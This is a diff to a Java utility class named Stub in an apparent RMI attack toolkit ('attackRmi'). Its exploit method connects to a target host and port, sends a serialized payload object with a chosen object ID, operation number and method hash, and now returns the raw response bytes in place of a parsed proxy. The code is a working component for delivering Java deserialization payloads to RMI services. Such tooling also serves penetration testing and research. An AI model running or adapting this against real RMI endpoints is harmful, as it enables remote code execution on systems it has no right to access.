@@ -1,22 +1,17 @@
 package com.wu.attackRmi.utils;
 
-
-import sun.rmi.server.MarshalInputStream;
 import sun.rmi.transport.TransportConstants;
 
 import javax.net.SocketFactory;
 import java.io.*;
-import java.lang.reflect.Proxy;
 import java.net.Socket;
 import java.rmi.server.ObjID;
-import java.rmi.server.UID;
 
 public class Stub {
 
-    public static Proxy exploit ( String hostname, int port, Object payloadObject, ObjID objid, int opnum, Long hash) throws Exception {
+    public static byte[] exploit ( String hostname, int port, Object payloadObject, ObjID objid, int opnum, Long hash) throws Exception {
         Socket s = null;
         DataOutputStream dos = null;
-        Proxy proxy = null;
         try {
             s = SocketFactory.getDefault().createSocket(hostname, port);
             s.setKeepAlive(true);
@@ -42,19 +37,17 @@ public class Stub {
             objOut.writeObject(payloadObject);
 
             os.flush();
-            //
-            if (opnum == 2){
-                InputStream ins = s.getInputStream();
-                byte[] buf = new byte[1];
-                ins.read(buf);
-                ObjectInputStream oins = new WuMarshalInputStream(ins);
-                oins.readByte();//return type
-                UID.read(oins);//ack dgc id
 
-                proxy = (Proxy) oins.readObject();
+            ByteArrayOutputStream bout = new ByteArrayOutputStream();
+            InputStream ins = s.getInputStream();
+            byte [] buf = new byte[1];
+
+            while(ins.read(buf) != -1){
+                bout.write(buf);
             }
 
-            return proxy;
+            byte [] returnData = bout.toByteArray();
+            return returnData;
         } finally {
             if (dos != null) {
                 dos.close();
